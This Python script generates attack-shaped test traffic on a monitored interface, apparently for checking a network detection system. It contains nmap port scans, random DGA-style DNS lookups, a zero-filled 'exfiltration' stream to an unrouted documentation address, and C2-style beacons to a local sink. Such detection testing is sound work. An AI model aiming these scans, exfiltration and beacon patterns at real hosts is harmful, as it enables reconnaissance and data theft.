"""Generate REAL attack-shaped traffic on the live interface (safe, self-contained).

Nothing here touches a real third party:
  - port/host scans target 192.0.2.0/24 (RFC 5737 TEST-NET-1, unrouted)
  - DGA lookups query random labels under a domain we control the *query* for; the
    resolver just returns NXDOMAIN, which is still a real bidirectional DNS exchange
  - the C2 beacon peers with a sink we start ourselves on this host's own subnet address
    reachable via the monitored NIC
"""
import os, random, socket, string, subprocess, sys, threading, time

IFACE = 'enp39s0'
ALPHA = string.ascii_lowercase + string.digits


def scan():
    print("[*] vertical + horizontal port scan -> 192.0.2.1 .. 192.0.2.4 (RFC5737)")
    for host in ('192.0.2.1', '192.0.2.2', '192.0.2.3', '192.0.2.4'):
        subprocess.run(['nmap', '-sT', '-Pn', '-n', '-p', '1-60',
                        '--max-retries', '0', '--host-timeout', '45s', host],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def horizontal():
    print("[*] horizontal scan: 1 host, many destination hosts")
    subprocess.run(['nmap', '-sT', '-Pn', '-n', '--max-retries', '0', '--host-timeout', '90s',
                    '-p', '80,443,22,53', '192.0.2.0/28'],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def dga(count=40):
    print(f"[*] {count} DGA-style DNS lookups (long, high-entropy labels -> NXDOMAIN)")
    for _ in range(count):
        label = ''.join(random.choice(ALPHA) for _ in range(random.randint(19, 26)))
        try:
            socket.getaddrinfo(f'{label}.example.com', None, socket.AF_INET)
        except Exception:
            pass
        time.sleep(0.05)


def exfil(mb=6):
    print(f"[*] sustained outbound transfer (~{mb} MB) to 198.51.100.77 (RFC5737)")
    blob = os.urandom(1 << 20) if False else b'\x00' * (1 << 20)
    s = socket.socket()
    s.settimeout(10)
    try:
        s.connect(('198.51.100.77', 8443))          # unrouted: SYN goes out on the wire
        for _ in range(mb):
            s.sendall(blob)
    except Exception as e:
        print(f"    (expected, unrouted: {type(e).__name__})")
    finally:
        s.close()


def beacon(seconds=150, period=15.0, port=8443):
    """Periodic client-initiated sessions to a peer we start ourselves."""
    print(f"[*] C2 beacon: 1 session every {period}s for {seconds}s (peer = local sink)")

    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(('0.0.0.0', port))
    srv.listen(64)
    stop = threading.Event()

    def serve():
        srv.settimeout(1.0)
        while not stop.is_set():
            try:
                c, _ = srv.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            try:
                c.recv(65535)
                c.sendall(b'\x00' * 512)   # heartbeat-sized response
            except OSError:
                pass
            finally:
                c.close()

    t = threading.Thread(target=serve, daemon=True)
    t.start()
    time.sleep(1)

    # aim at this host's own subnet address so the exchange is real and bidirectional
    dst = None
    for cand in socket.gethostbyname_ex(socket.gethostname())[2]:
        if cand.startswith('172.31.'):
            dst = cand
            break
    dst = dst or '127.0.0.1'
    print(f"    beacon peer {dst}:{port} over {IFACE}")

    end = time.time() + seconds
    n = 0
    while time.time() < end:
        try:
            s = socket.socket()
            s.settimeout(6)
            s.connect((dst, port))
            s.sendall(bytes(n % 256 for _ in range(256)))
            try:
                s.recv(4096)
            except OSError:
                pass
            s.close()
            n += 1
        except OSError as e:
            print(f"    beacon err: {e}")
        time.sleep(period)
    stop.set()
    srv.close()
    print(f"    sent {n} beacon sessions")


if __name__ == '__main__':
    which = sys.argv[1] if len(sys.argv) > 1 else 'all'
    jobs = {'scan': scan, 'horizontal': horizontal, 'dga': dga, 'exfil': exfil, 'beacon': beacon}
    if which == 'all':
        scan(); dga(); exfil(); beacon()
    else:
        jobs[which]()
    time.sleep(20)   # let the 10s idle flow-finalisation flush emit the conn events
    print("[+] done")
